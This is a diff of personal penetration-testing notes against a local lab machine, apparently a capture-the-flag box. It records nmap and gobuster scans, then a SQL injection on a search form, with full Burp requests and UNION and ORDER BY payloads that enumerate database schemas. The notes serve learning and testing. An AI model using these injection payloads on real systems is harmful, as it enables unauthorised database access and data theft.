@@ -1,3 +1,5 @@
+SQL Injection reference: https://pentestmonkey.net/category/cheat-sheet/sql-injection 
+
 1. nmap scan of the box: 
 PORT   STATE SERVICE VERSION
 80/tcp open  http    Apache httpd 2.4.38 ((Debian))
@@ -7,7 +9,8 @@ PORT   STATE SERVICE VERSION
 only seeing 80 is open
 
 2. checking out the example site. 
-Standard example site, and search seems to be the most interesting page. 
+- Standard example site, and search seems to be the most interesting page. 
+  search takes first name or last name and returns a result 
 
 3. run a gobuster against the site. 
 gobuster dir -u http://10.0.2.4 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -o gobuster-main.out
@@ -18,4 +21,73 @@ dir == setting gobuster to use directory mode
 
 Results in gobuster-main.out
 
-4. Send requests to burp
+4. Testing SQL Injection requests to search in burp with intercept on. 
+- No SQL error with simple test of <FIRSTNAME> and a ' at the end 
+- Data is returned when a comment is added " <FIRSTNAME>'-- - "
+- SQL injection is possible 
+- reference of what gets returned names: 
+        ID: 1
+        Name: Mary Moe
+        Position: CEO
+        Phone No: 46478415155456
+        Email: marym@example.com
+- SQL UNION Injection PoC: 
+-- In order for a UNION to work I need to know what should be included in the select. 
+Using the above return as a reference testing UNION in burp: 
+
+POST /results.php HTTP/1.1
+Host: 10.0.2.4
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 41
+Origin: http://10.0.2.4
+Connection: close
+Referer: http://10.0.2.4/search.php
+Upgrade-Insecure-Requests: 1
+
+search=Mary' UNION SELECT 1,2,3,4,5,6-- -
+
+The above request returns the following it its response once 6 args are passed: 
+                ID: 1<br/>Name: 2 3<br/>
+                Position: 4<br />
+                Phone No: 5<br />
+                Email: 6<br/><br/>Another test can be done by passing database()First and Last
+
+NOTE: you can also use ORDER BY to tests results in a response. Pass the following Query until the response is different (byte size)
+Example: 
+
+POST /results.php HTTP/1.1
+Host: 10.0.2.4
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 28
+Origin: http://10.0.2.4
+Connection: close
+Referer: http://10.0.2.4/search.php
+Upgrade-Insecure-Requests: 1
+
+search=Mary' ORDER BY 7 -- -
+
+On the 7th request the bytes are differnt than the previous 6 requests. This tells me that SQL was not able to find a match. 
+
+Gathering more information about the schema with: 
+search=Mary' UNION SELECT SCHEMA_NAME,2,3,4,5,6 FROM information_schema.schemata-- -
+
+Returns: 
+ID: 1                  
+ID: information_schema << 
+ID: Staff
+ID: users
+
+All of the above information can be returned on a single line with: 
+search=Mary' UNION SELECT group_concat(SCHEMA_NAME),2,3,4,5,6 FROM information_schema.schemata-- -
+
+Result: 
+ID: information_schema,Staff,users
+
